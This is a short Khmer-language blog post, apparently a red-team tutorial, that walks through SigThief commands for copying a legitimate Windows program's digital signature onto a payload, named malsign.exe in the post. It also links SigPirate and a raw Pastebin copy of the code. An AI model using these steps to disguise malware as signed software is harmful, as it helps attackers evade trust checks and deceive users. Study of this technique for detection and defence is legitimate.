---
title: "Hijacking Digital Signatures"
date: 2023-07-08T16:22:34+07:00
description: ខ្លីឃ្លឹមអំពីវិធីសាស្ត្រលួចយក Digital Signatures
draft: false
hideToc: false
enableToc: true
enableTocContent: false
author: thik
authorEmoji: 🐱
tags:
- hijacking
- digiral-signatures
categories:
- CA
series:
- WinExE
image: images/feature3/ca.png
---

មានវិធីសាស្ត្រជាច្រើនក្នុងការលួចយក ឬ ចម្លងយក Digital Signatures ចេញពីឯកសារពិតប្រាកដណាមួយនៅក្នុងប្រព័ន្ធវីនដូ ។ តែថ្ងៃនេះយើងនឹងមកមើលឧបករណ៍មួយដែលអាចជួយឲ្យមានភាពងាយស្រួលក្នុងការលួចយក Signatures ដែលមាននៅក្នុងឯកសារ Binary រួចដាក់បញ្ជូលទៅក្នុង Payload បានយ៉ាងឆាប់រហ័ស ។

#### Digital Signatures Hijacking Tools

<b>[SigThif](https://github.com/secretsquirrel/SigThief.git)</b> ងាយៗជាមួយ SigThif ក្នុងការលួចយក Signatures ពីកម្មវិធីជាច្រើននៅក្នងវីនដូ ។

##### វិធីប្រើ
{{< highlight zsh "linenos=table" >}}
git clone https://github.com/secretsquirrel/SigThief.git
cd SigThief

// លួចយក Signature ចេញពីកម្មវិធីរួចដាក់ចូលទៅក្នុង Payload
python3 sigthief.py -i putty.exe -t payload.exe -o malsign.exe

// យក Signature ចេញ និងរក្សាទុកប្រើពេលក្រោយ
python3 sigthief.py -i putty.exe -r

// យក Signature ដែលរក្សាទុកមកប្រើប្រាស់វិញ
python3 sigthief.py -s putty.exe_sig -t payload.exe

// លុប Signature ចេញពី Binary
python3 sigthief.py -i anybinary.exe -T

{{< / highlight >}}

<b>Raw Code</b> [Pastebin](https://pastebin.com/raw/76KCufMA)

ក៏មានឧបករណ៍មួយទៀតដែរ ដែលអាចប្រើបាននៅក្នុងវីនដូម៉ាស៊ីនឈ្មោះថា [SigPirate](https://github.com/xorrior/Random-CSharpTools/tree/master/SigPirate) ដែលមានភាពងាយស្រួលប្រើដូចគ្នា ៕
